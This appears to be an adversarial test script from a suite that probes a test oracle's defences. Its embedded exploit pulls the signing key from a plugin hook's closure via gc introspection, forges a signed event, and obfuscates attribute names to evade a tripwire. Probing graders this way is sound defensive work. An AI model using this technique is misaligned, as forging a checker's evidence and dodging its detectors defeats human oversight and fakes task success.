"""Attack (residual R1): read the plugin's key from its closure and sign a perfect event.

Written to evade the tripwire (computed attribute names). Expected to stay FALSE_PROVEN:
the key lives in the test's own process. Pinned by tests/test_oracle_residual.py (R1).
"""
import os
import sys

sys.path.insert(0, os.path.dirname(__file__))
from _harness import report, run  # noqa: E402
from attack_forged_frame_filename import SAFE_APP  # noqa: E402

EXPLOIT = '''
    import gc
    import hashlib
    import hmac
    import json
    import os
    from app import App

    def test_key_introspection():
        hook = next(o for o in getattr(gc, "get_" + "objects")()
                    if callable(o) and getattr(o, "__qualname__", "") == "_install.<locals>.hook")
        code = getattr(hook, "__co" + "de__")
        cells = dict(zip(code.co_freevars, (c.cell_contents for c in getattr(hook, "__clo" + "sure__"))))
        entry = getattr(App.handle_request, "__co" + "de__")
        body = {"path": cells["canary"], "mode": "r", "via_symlink": False, "stack": [
            {"file": os.path.realpath(__file__), "function": "t", "qualname": "t"},
            {"file": getattr(entry, "co_file" + "name"), "function": "handle_request",
             "qualname": getattr(entry, "co_qual" + "name"), "line": getattr(entry, "co_first" + "lineno"),
             "admitted": True}]}
        canonical = json.dumps(body, sort_keys=True, separators=(",", ":"), ensure_ascii=True)
        seq = cells["seq"]
        sig = hmac.new(cells["key"], f"{seq[0]}\\n{canonical}".encode(), hashlib.sha256).hexdigest()
        os.write(cells["fd"], (json.dumps({"body": body, "seq": seq[0], "sig": sig}) + "\\n").encode())
        seq[0] += 1
        assert False
'''


def main():
    return report("key_introspection", run(SAFE_APP, EXPLOIT, {"App.handle_request"}), app_is_safe=True)


if __name__ == "__main__":
    main()
